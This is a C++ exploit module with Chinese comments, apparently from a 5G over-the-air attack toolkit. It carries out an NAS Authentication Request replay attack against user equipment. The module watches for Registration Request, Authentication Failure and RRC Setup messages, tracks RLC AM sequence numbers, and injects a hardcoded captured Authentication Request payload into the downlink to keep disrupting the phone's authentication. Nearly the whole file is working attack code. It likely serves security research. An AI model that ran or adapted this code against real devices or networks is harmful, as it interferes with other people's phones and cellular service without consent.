/**
 * @file dg_authentication_replay.cc
 * @brief 主动攻击模块 —— 5G NAS 认证请求重放攻击
 *
 * 攻击原理：
 *   当嗅探到 UE 发送 Registration Request (0x41) 或 Authentication Failure (0x59) 时，
 *   向 UE 注入一个预先捕获的 Authentication Request 消息。
 *   由于认证请求未加密 (在安全上下文建立之前)，UE 会尝试处理该消息。
 *
 * 攻击流程：
 *   1. UE 发送 RRC Setup Request -> 重置 RLC 序列号
 *   2. UE 发送 Registration Request (SN=0) -> 触发重放
 *   3. UE 返回 Authentication Failure -> 再次重放 (持续干扰)
 *   4. 收到 NACK -> 使用 NACK 中的 SN 更新序列号后再次重放
 *
 * RLC 序列号管理：
 *   5G NR 的 RLC AM (确认模式) 要求每个 PDU 带有正确的序列号，
 *   否则 UE 会丢弃消息。因此本模块需要跟踪并维护：
 *   - dl_sn:     下行数据 SN (我方发送的 PDU 序列号)
 *   - dl_ack_sn: 下行 ACK SN (确认对方已接收到的最高 SN)
 */

#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

/**
 * 预先捕获的 Authentication Request 原始字节 (MAC-NR 层)
 *
 * 结构 (从外到内)：
 *   [0..4]  RLC AM 头 + ACK (5字节，ack_rlc 部分)
 *   [5..]   MAC SDU 载荷，包含 RLC AM 数据 PDU -> PDCP -> RRC -> NAS Authentication Request
 *
 * 运行时会动态修改以下字节以匹配当前 RLC 状态：
 *   [3]  = dl_ack_sn  (对 UE 上行消息的确认)
 *   [8]  = dl_sn      (本 PDU 的序列号)
 *   [10] = dl_sn      (冗余 SN 字段)
 */
const uint8_t authentication_request[] = {
    0x01, 0x03, 0x00, 0x01,
    0x00, // ACK SN = 1
    0x01, 0x35, 0xc0, 0x01, 0x00, 0x01, 0x28, 0x85, 0x4f, 0xc0, 0x0a, 0xc0, 0x80, 0x40, 0x00, 0x04, 0x2a, 0x44,
    0x23, 0x64, 0xd9, 0x54, 0xd5, 0xe0, 0x1c, 0x35, 0x0d, 0xc1, 0xa8, 0x57, 0x28, 0x4d, 0xc4, 0x02, 0x10, 0x74,
    0xcb, 0x95, 0xf5, 0x44, 0x90, 0x00, 0x0e, 0x3c, 0xf4, 0xeb, 0x42, 0xf7, 0x21, 0xfa, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

class AuthenticationReplayExploit : public Exploit
{
public:
  AuthenticationReplayExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    // 将硬编码的认证请求数据复制到可修改的 shared_ptr 缓冲区中
    auth_req.reset(
        new std::vector<uint8_t>(authentication_request, authentication_request + sizeof(authentication_request)));
  }

  void setup() override
  {
    // NAS Registration Request (0x41) —— UE 发起注册时触发重放
    f_registration_request   = wd_filter("nas_5gs.mm.message_type == 0x41");
    // NAS Authentication Failure (0x59) —— UE 认证失败时再次重放
    f_authentication_failure = wd_filter("nas_5gs.mm.message_type == 0x59");
    // RRC Setup Request (c1==0) —— 新的 RRC 连接建立，需要重置序列号
    f_rrc_setup_request      = wd_filter("nr-rrc.c1 == 0");
    // RLC AM 层的序列号字段，用于跟踪当前 RLC 状态
    f_ack_sn                 = wd_field("rlc-nr.am.ack-sn");
    f_sn                     = wd_field("rlc-nr.am.sn");
    f_nack_sn                = wd_field("rlc-nr.am.nack-sn");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_authentication_failure);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
    wd_register_field(wd, f_nack_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // --- RLC 序列号跟踪 (上行方向) ---

      // 读取 UE 发来的 ACK SN：表示 UE 已确认收到我方发送的数据到此编号
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
          logger.info(YELLOW "Update sequence number to %u" RESET, dl_sn);
        }
      }

      // 读取上行数据 PDU 的 SN：更新我方的 ACK SN (告知 UE 我方收到了哪些包)
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv + 1;
          logger.info(YELLOW "Update ACK sequence number to %u" RESET, dl_sn);
        }
        // SN == 0 通常是 Registration Request 的第一个 RLC PDU
        if (sn_recv == 0) {
          logger.info(YELLOW "Received registration request" RESET);
          replay_authentication_request(logger);
          return;
        }
      }

      // 收到 NACK：UE 报告未收到某个 SN 的数据，更新 SN 并重发
      wd_field_info_t nack_sn_info = wd_read_field(wd, f_nack_sn);
      if (nack_sn_info) {
        uint32_t nack_sn_recv = packet_read_field_uint32(nack_sn_info);
        dl_sn                 = nack_sn_recv;
        logger.info(YELLOW "Update sequence number to NACK %u" RESET, dl_sn);
        replay_authentication_request(logger);
      }
    }

    // 检测到 RRC Setup Request -> 说明新的 RRC 连接开始，重置序列号计数器
    if (wd_read_filter(wd, f_rrc_setup_request)) {
      dl_sn     = 0;
      dl_ack_sn = 1;
    }

    // 检测到 NAS Registration Request -> 发起认证重放
    if (wd_read_filter(wd, f_registration_request)) {
      logger.info(YELLOW "Received registration request" RESET);
      replay_authentication_request(logger);
      return;
    }

    // 检测到 NAS Authentication Failure -> 再次重放 (持续干扰认证流程)
    if (wd_read_filter(wd, f_authentication_failure)) {
      logger.info(YELLOW "Received authentication failure" RESET);
      replay_authentication_request(logger);
      return;
    }
  }

private:
  /**
   * @brief 执行认证请求重放：更新 RLC 序列号后注入下行数据包
   *
   * 修改载荷中的序列号字段，使其与当前 RLC 状态匹配，
   * 然后推入下行缓冲区队列等待 Scheduler 发射。
   */
  void replay_authentication_request(srslog::basic_logger& logger)
  {
    if (auth_req->empty()) {
      return;
    }
    auth_req->data()[3]  = dl_ack_sn & 0xff; // RLC STATUS PDU 中的 ACK SN
    auth_req->data()[8]  = dl_sn & 0xff;     // RLC AM 数据 PDU 的 SN
    auth_req->data()[10] = dl_sn & 0xff;     // 冗余 SN 字段
    dl_buffer_queue.push(auth_req);
    logger.info(YELLOW "Replay authentication request" RESET);
  }

  wd_filter_t f_registration_request;    ///< NAS Registration Request 过滤器
  wd_filter_t f_authentication_failure;  ///< NAS Authentication Failure 过滤器
  wd_filter_t f_rrc_setup_request;       ///< RRC Setup Request 过滤器
  wd_field_t  f_ack_sn;                  ///< RLC AM ACK SN 字段
  wd_field_t  f_sn;                      ///< RLC AM 数据 SN 字段
  wd_field_t  f_nack_sn;                 ///< RLC AM NACK SN 字段
  uint32_t    dl_sn     = 0;             ///< 当前下行发送 SN
  uint32_t    dl_ack_sn = 2;             ///< 当前下行 ACK SN

  std::shared_ptr<std::vector<uint8_t> > auth_req; ///< 待重放的认证请求载荷
};

/* 模块工厂函数 */
extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationReplayExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}
